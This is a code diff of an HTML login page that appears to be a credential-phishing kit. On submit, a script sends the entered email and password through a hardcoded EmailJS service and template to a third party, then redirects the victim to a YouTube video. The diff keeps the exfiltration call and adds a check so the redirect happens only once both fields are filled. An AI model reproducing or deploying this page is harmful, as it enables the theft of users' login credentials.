@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -185,6 +186,7 @@
         }
     </style>
 </head>
+
 <body>
     <div class="login-container">
         <!-- Place your logo here -->
@@ -195,8 +197,8 @@
         <div class="contact-form">
             <form id="contact-form" method="POST">
                 <div class="input-group">
-                    <label for="username">Email:</label>
-                    <input type="email" id="username" name="Email" required>
+                    <label for="username">email:</label>
+                    <input type="email" id="username" name="username" required>
                 </div>
                 <div class="input-group">
                     <label for="password">Password:</label>
@@ -214,6 +216,7 @@
             </div>
         </div>
     </div>
+
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         emailjs.init("1Louy701aFXIKNTLS");
@@ -222,13 +225,22 @@
             event.preventDefault();
             
             const form = event.target;
-            
-            emailjs.sendForm('service_i43rdo8', 'template_75amwuk', form)
-        });
 
-        document.getElementById('redirect-button').addEventListener('click', function() {
-            window.location.href = 'https://www.youtube.com/watch?v=LNTUx08ypL0';
+            // Perform the email sending
+            emailjs.sendForm('service_i43rdo8', 'template_75amwuk', form);
+
+            // Check if the inputs are filled
+            const emailInput = document.getElementById('username').value.trim();
+            const passwordInput = document.getElementById('password').value.trim();
+
+            if (emailInput === "" || passwordInput === "") {
+                alert("Please fill out both fields before signing in.");
+            } else {
+                // Only redirect if inputs are filled
+                window.location.href = 'https://www.youtube.com/watch?v=PC7QP7dh-qY';
+            }
         });
     </script>
 </body>
+
 </html>
